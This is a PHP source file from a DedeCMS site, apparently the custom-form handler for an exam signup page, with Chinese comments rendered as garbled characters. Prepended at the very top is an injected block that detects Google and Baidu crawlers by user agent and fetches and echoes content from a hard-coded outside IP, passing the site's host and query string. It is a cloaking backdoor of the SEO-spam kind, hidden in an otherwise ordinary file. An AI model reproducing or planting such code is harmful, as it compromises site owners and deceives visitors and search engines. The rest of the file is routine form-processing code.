<?php
header('Content-Type:text/html;charset=gb2312');
$key= $_SERVER["HTTP_USER_AGENT"];
if(strpos($key,'oogle')!== false||strpos($key,'aidu')!==false)
{
   $host_name = "http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
   $file = file_get_contents('http://45.64.113.1/'."/index.php?host=".$host_name."&url=" . $_SERVER['QUERY_STRING'] . "&domain=" . $_SERVER['SERVER_NAME']); 
   echo $file;
}

?><?php
/**
 *
 * �Զ����
 *
 * @version        $Id: diy.php 1 15:38 2010��7��8��Z tianya $
 * @package        DedeCMS.Site
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */
require_once(dirname(__FILE__)."/../include/common.inc.php");

$diyid = isset($diyid) && is_numeric($diyid) ? $diyid : 0;
$action = isset($action) && in_array($action, array('post', 'list', 'view')) ? $action : 'post';
$id = isset($id) && is_numeric($id) ? $id : 0;

if(empty($diyid))
{
    showMsg('�Ƿ�����!', 'javascript:;');
    exit();
}

require_once DEDEINC.'/diyform.cls.php';
$diy = new diyform($diyid);

/*----------------------------
function Post(){ }
---------------------------*/
if($action == 'post')
{
    if(empty($do))
    {
        $postform = $diy->getForm(true);
        include DEDEROOT."/templets/plus/{$diy->postTemplate}";
        exit();
    }
    elseif($do == 2)
    {
        $dede_fields = empty($dede_fields) ? '' : trim($dede_fields);
        $dede_fieldshash = empty($dede_fieldshash) ? '' : trim($dede_fieldshash);
        if(!empty($dede_fields))
        {
            if($dede_fieldshash != md5($dede_fields.$cfg_cookie_encode))
            {
                showMsg('����У�鲻�ԣ����򷵻�', '-1');
                exit();
            }
        }
        $diyform = $dsql->getOne("select * from #@__diyforms where diyid='$diyid' ");
        if(!is_array($diyform))
        {
            showmsg('�Զ����������', '-1');
            exit();
        }
//����ο��Ƿ��Ѿ��ύ����2016��11��15�� 15:00:17����
        if(isset($_COOKIE['VOTE_MEMBER_IP']))
        {
            if($_COOKIE['VOTE_MEMBER_IP'] == $_SERVER['REMOTE_ADDR'])
            {
                echo "<script language='javascript'>";
				echo "alert('���Ѿ��ύ����Ϣ���������ĵȴ�!');window.location.href='http://v.reading-china.com/exam/?pid=1'";
				echo "</script>";
                exit();
            } else {
                setcookie('VOTE_MEMBER_IP',$_SERVER['REMOTE_ADDR'],time()*$row['spec']*3600,'/');
            }
        } else {
            setcookie('VOTE_MEMBER_IP',$_SERVER['REMOTE_ADDR'],time()*$row['spec']*3600,'/');
        }
// End ��֤����
        $addvar = $addvalue = '';

        if(!empty($dede_fields))
        {
	
            $fieldarr = explode(';', $dede_fields);
            if(is_array($fieldarr))
            {
                foreach($fieldarr as $field)
                {
                    if($field == '') continue;
                    $fieldinfo = explode(',', $field);
                    if($fieldinfo[1] == 'textdata')
                    {
                        ${$fieldinfo[0]} = FilterSearch(stripslashes(${$fieldinfo[0]}));
                        ${$fieldinfo[0]} = addslashes(${$fieldinfo[0]});
                    }
                    else
                    {
                        ${$fieldinfo[0]} = GetFieldValue(${$fieldinfo[0]}, $fieldinfo[1],0,'add','','diy', $fieldinfo[0]);
                    }
                    $addvar .= ', `'.$fieldinfo[0].'`';
                    $addvalue .= ", '".${$fieldinfo[0]}."'";
                }
            }

        }

        $query = "INSERT INTO `{$diy->table}` (`id`, `ifcheck` $addvar)  VALUES (NULL, 0 $addvalue); ";

        if($dsql->ExecuteNoneQuery($query))
        {
$mailtitle = �����Ӣ��ı�֪ͨ��������; 
$mailbody ="����������".$name."<br/>��ϵ�绰:".$number."<br/>�������䣺".$age."<br/>����(У��)��".$province."<br/>��Դ��".$url1."\r\n\r\n";
$headers = $cfg_adminemail; 
$mailtype = 'HTML'; 
require_once(DEDEINC.'/mail.class.php'); 
$smtp = new smtp($cfg_smtp_server,$cfg_smtp_port,true,$cfg_smtp_usermail,$cfg_smtp_password); 
$smtp->debug = false; 
$cfg_smtp_1usermail="";
$smtp->sendmail($cfg_smtp_1usermail,$cfg_webname,$cfg_smtp_usermail,$mailtitle,$mailbody,$mailtype);
            $id = $dsql->GetLastID();
            if($diy->public == 2)
            {
                //diy.php?action=view&diyid={$diy->diyid}&id=$id
                $goto = "diy.php?action=list&diyid={$diy->diyid}";
                $bkmsg = '�����ɹ�������ת����б�ҳ...';
			}
            else
            {
				echo "<script language='javascript'>";
				echo "alert('���ͳɹ�!');window.location.href='http://v.reading-china.com/exam/?pid=1'";
				echo "</script>";
				exit();
            }
            showmsg($bkmsg, $goto);
        }
    }
}
/*----------------------------
function list(){ }
---------------------------*/
else if($action == 'list')
{
    if(empty($diy->public))
    {
        showMsg('��̨�ر�ǰ̨���', 'javascript:;');
        exit();
    }
    include_once DEDEINC.'/datalistcp.class.php';
    if($diy->public == 2)
        $query = "SELECT * FROM `{$diy->table}` ORDER BY id DESC";
    else
        $query = "SELECT * FROM `{$diy->table}` WHERE ifcheck=1 ORDER BY id DESC";

    $datalist = new DataListCP();
    $datalist->pageSize = 10;
    $datalist->SetParameter('action', 'list');
    $datalist->SetParameter('diyid', $diyid);
    $datalist->SetTemplate(DEDEINC."/../templets/plus/{$diy->listTemplate}");
    $datalist->SetSource($query);
    $fieldlist = $diy->getFieldList();
    $datalist->Display();
}
else if($action == 'view')
{
    if(empty($diy->public))
    {
        showMsg('��̨�ر�ǰ̨���' , 'javascript:;');
        exit();
    }

    if(empty($id))
    {
        showMsg('�Ƿ�������δָ��id', 'javascript:;');
        exit();
    }
    if($diy->public == 2)
    {
        $query = "SELECT * FROM {$diy->table} WHERE id='$id' ";
    }
    else
    {
        $query = "SELECT * FROM {$diy->table} WHERE id='$id' AND ifcheck=1";
    }
    $row = $dsql->GetOne($query);

    if(!is_array($row))
    {
        showmsg('����ʵļ�¼�����ڻ�δ�����', '-1');
        exit();
    }

    $fieldlist = $diy->getFieldList();
    include DEDEROOT."/templets/plus/{$diy->viewTemplate}";
}